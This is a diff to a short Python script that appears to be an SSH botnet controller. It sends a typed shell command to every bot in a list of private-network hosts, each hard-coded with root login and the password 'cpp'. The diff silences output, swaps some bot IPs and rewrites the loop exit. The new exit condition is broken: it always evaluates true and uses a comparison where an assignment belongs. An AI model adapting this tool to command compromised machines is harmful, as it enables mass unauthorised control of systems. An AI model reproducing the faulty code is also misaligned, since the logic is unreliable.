@@ -31,10 +31,11 @@ class Bot:
 # send a command to all bots in the botnet
 def command_bots(command):
     for bot in botnet:
-        attack = bot.send_command(command)
-    for bot in botnet:
-        print('Output from ' + bot.host)
-        print(attack)
+#        attack = bot.send_command(command)
+	bot.send_command(command)
+#    for bot in botnet:
+#        print('Output from ' + bot.host)
+#        print(attack)
 
 # list of bots in botnet
 botnet = []
@@ -47,8 +48,8 @@ def add_bot(host, user, password):
 add_bot('192.168.1.13', 'root', 'cpp')
 add_bot('192.168.1.27', 'root', 'cpp')
 add_bot('192.168.1.28', 'root', 'cpp')
-add_bot('192.168.1.29', 'root', 'cpp')
-add_bot('192.168.1.30', 'root', 'cpp')
+add_bot('192.168.1.26', 'root', 'cpp')
+add_bot('192.168.1.25', 'root', 'cpp')
 add_bot('192.168.1.31', 'root', 'cpp')
 add_bot('192.168.1.21', 'root', 'cpp')
 add_bot('192.168.1.22', 'root', 'cpp')
@@ -68,8 +69,5 @@ while isDone == False:
 	command_bots(command)
 	print("Would you like to send another command?[y/n]")
 	response=raw_input()
-	if response == 'y' or 'Y':
-		continue
-	else:
-        	isDone= True
-		break
+	if response == 'n' or 'N':
+		isDone == True
